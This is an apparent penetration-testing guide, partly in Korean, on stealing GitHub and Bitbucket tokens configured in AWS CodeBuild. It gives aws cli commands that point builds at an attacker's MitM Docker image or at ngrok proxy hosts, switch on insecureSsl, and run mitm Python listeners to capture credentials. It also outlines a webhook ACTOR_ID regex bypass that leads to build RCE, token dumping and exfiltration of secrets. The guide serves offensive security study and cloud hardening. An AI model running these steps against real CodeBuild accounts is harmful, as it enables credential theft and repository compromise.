# AWS Codebuild - Token Leakage

{{#include ../../../../banners/hacktricks-training.md}}

## Recover Github/Bitbucket Configured Tokens

먼저, leak할 수 있는 source credentials가 구성되어 있는지 확인하세요:
```bash
aws codebuild list-source-credentials
```
### Via Docker Image

If you find that authentication to for example Github is set in the account, you can **exfiltrate** that **access** (**GH token or OAuth token**) by making Codebuild to **use an specific docker image** to run the build of the project.

For this purpose you could **create a new Codebuild project** or change the **environment** of an existing one to set the **Docker image**.

The Docker image you could use is [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm). This is a very basic Docker image that will set the **env variables `https_proxy`**, **`http_proxy`** and **`SSL_CERT_FILE`**. This will allow you to intercept most of the traffic of the host indicated in **`https_proxy`** and **`http_proxy`** and trusting the SSL CERT indicated in **`SSL_CERT_FILE`**.

1. **Create & Upload your own Docker MitM image**
- 레포지토리의 지침을 따라 proxy IP 주소와 SSL cert를 설정하고 **build the docker image** 하세요.
- 메타데이터 엔드포인트로의 요청을 가로채지 않으려면 **DO NOT SET `http_proxy`**.
- 프록시를 호스트로 설정하려면 **`ngrok`**을 사용하여 `ngrok tcp 4444`처럼 실행할 수 있습니다.
- Docker image를 빌드한 후 **upload it to a public repo** (Dockerhub, ECR...)
2. **Set the environment**
- **Create a new Codebuild project**를 만들거나 기존 프로젝트의 **modify**된 environment를 사용하세요.
- 프로젝트가 **previously generated Docker image**를 사용하도록 설정하세요.

<figure><img src="../../../../images/image (23).png" alt=""><figcaption></figcaption></figure>

3. **Set the MitM proxy in your host**

- **Github repo**에 명시된 것처럼 다음과 같은 방법을 사용할 수 있습니다:
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
> [!TIP]
> **사용된 mitmproxy 버전은 9.0.1입니다**, 버전 10에서는 작동하지 않을 수 있다고 보고되었습니다.
 
4. **빌드를 실행하고 자격 증명을 캡처하기**

- **Authorization** 헤더에서 토큰을 볼 수 있습니다:

<figure><img src="../../../../images/image (273).png" alt=""><figcaption></figcaption></figure>

이 작업은 aws cli에서도 다음과 같이 수행할 수 있습니다
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
### insecureSSL를 통해

**Codebuild** 프로젝트에는 **`insecureSsl`**라는 설정이 있으며 웹에서는 숨겨져 있어 API에서만 변경할 수 있습니다.\
이를 활성화하면 Codebuild가 플랫폼에서 제공하는 인증서를 **검증하지 않고** 리포지토리에 연결할 수 있습니다.

- 먼저 다음과 같은 명령으로 현재 구성을 열거해야 합니다:
```bash
aws codebuild batch-get-projects --name <proj-name>
```
- 그런 다음 수집한 정보로 프로젝트 설정 **`insecureSsl`** 를 **`True`** 로 업데이트할 수 있습니다. 아래는 제가 프로젝트를 업데이트한 예이며, 마지막에 **`insecureSsl=True`** 가 있는 것을 확인하세요 (수집된 설정에서 변경해야 할 유일한 항목입니다).
- 또한 환경 변수 **http_proxy** 및 **https_proxy** 를 tcp ngrok처럼 가리키도록 다음과 같이 추가하세요:
```bash
aws codebuild update-project --name <proj-name> \
--source '{
"type": "GITHUB",
"location": "https://github.com/carlospolop/404checker",
"gitCloneDepth": 1,
"gitSubmodulesConfig": {
"fetchSubmodules": false
},
"buildspec": "version: 0.2\n\nphases:\n  build:\n    commands:\n       - echo \"sad\"\n",
"auth": {
"type": "CODECONNECTIONS",
"resource": "arn:aws:codeconnections:eu-west-1:947247140022:connection/46cf78ac-7f60-4d7d-bf86-5011cfd3f4be"
},
"reportBuildStatus": false,
"insecureSsl": true
}' \
--environment '{
"type": "LINUX_CONTAINER",
"image": "aws/codebuild/standard:5.0",
"computeType": "BUILD_GENERAL1_SMALL",
"environmentVariables": [
{
"name": "http_proxy",
"value": "http://2.tcp.eu.ngrok.io:15027"
},
{
"name": "https_proxy",
"value": "http://2.tcp.eu.ngrok.io:15027"
}
]
}'
```
- 그런 다음, [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm)의 기본 예제를 proxy variables (http_proxy and https_proxy)가 가리키는 포트에서 실행합니다.
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
- 마지막으로 **Build the project**를 클릭하면, **credentials**가 **sent in clear text** (base64)로 mitm 포트로 전송된다:

<figure><img src="../../../../images/image (1) (1).png" alt=""><figcaption></figcaption></figure>

### ~~Via HTTP protocol~~

> [!TIP] > **This vulnerability was corrected by AWS at some point the week of the 20th of Feb of 2023 (I think on Friday). So an attacker can't abuse it anymore :)**

권한이 상승한 공격자는 **CodeBuild에서 구성된 Github/Bitbucket token을 leak할 수 있으며**, 권한이 OAuth로 구성되어 있다면 코드에 접근하는 데 사용되는 **temporary OAuth token**을 leak할 수 있다.

- 공격자는 환경 변수 **http_proxy** 및 **https_proxy**를 CodeBuild 프로젝트에 추가하여 자신의 머신을 가리키게 할 수 있다 (예: `http://5.tcp.eu.ngrok.io:14972`).

<figure><img src="../../../../images/image (232).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../images/image (213).png" alt=""><figcaption></figcaption></figure>

- 그 다음, github 리포지토리의 URL을 HTTPS 대신 HTTP를 사용하도록 변경한다, 예: `http://github.com/carlospolop-forks/TestActions`
- 그런 다음, proxy 변수들(http_proxy 및 https_proxy)이 가리키는 포트에서 [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm)에 있는 기본 예제를 실행한다.
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="0.0.0.0",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
- 다음으로, **프로젝트 빌드**를 클릭하거나 명령줄에서 빌드를 시작하세요:
```sh
aws codebuild start-build --project-name <proj-name>
```
- 마지막으로, **credentials**는 **clear text** (base64)로 mitm 포트로 전송됩니다:

<figure><img src="../../../../images/image (159).png" alt=""><figcaption></figcaption></figure>

> [!WARNING]
> 이제 공격자는 자신의 머신에서 token을 사용해 해당 토큰이 가진 모든 권한을 확인하고, CodeBuild 서비스를 직접 사용하는 것보다 더 쉽게 (ab)use할 수 있습니다.

## Webhook filter ACTOR_ID regex allowlist bypass (PR-triggered privileged builds)

잘못 구성된 CodeBuild GitHub webhooks로, unanchored `ACTOR_ID` regexes를 사용하면 *untrusted* PR들이 privileged builds를 시작할 수 있습니다. allowlist가 `123456|7890123`처럼 `^`/`$` 없이 설정되어 있으면, 해당 하위문자열(substring)을 포함하는 어떤 ID든 매치됩니다. GitHub 사용자 ID는 순차적이기 때문에, 공격자는 신뢰된 ID의 superstring인 “eclipsing” ID를 등록하기 위해 경쟁(race)하여 빌드를 트리거할 수 있습니다.

**Exploit path**

1. 공개된 CodeBuild 프로젝트 중 webhook filters를 노출하는 것을 찾아 unanchored `ACTOR_ID` allowlist를 추출합니다.
2. eclipsing GitHub ID 획득:
- GitHub orgs를 생성/삭제하여 global ID counter를 샘플링합니다 (org IDs는 같은 풀을 공유합니다).
- 많은 GitHub App manifest 생성 작업을 미리 준비해두고, 카운터가 대상에서 약 ~100 IDs 이내로 접근했을 때 confirmation URLs를 발동시켜 신뢰된 substring을 포함한 bot ID를 한꺼번에 등록합니다.
3. eclipsing 계정으로 PR을 엽니다; regex가 substring을 매치하여 privileged build가 실행됩니다.
4. build RCE(예: dependency install hooks)를 이용해 GitHub credential을 처리하는 프로세스 메모리를 덤프하여 PAT/OAuth token을 복구합니다.
5. 토큰의 `repo` scope로 자신의 계정을 collaborator/admin으로 초대하고, 악성 커밋을 push/approve 하거나 비밀을 exfiltrate합니다.

## References
- [Wiz: CodeBreach – AWS CodeBuild ACTOR_ID regex bypass and token theft](https://www.wiz.io/blog/wiz-research-codebreach-vulnerability-aws-codebuild)

{{#include ../../../../banners/hacktricks-training.md}}
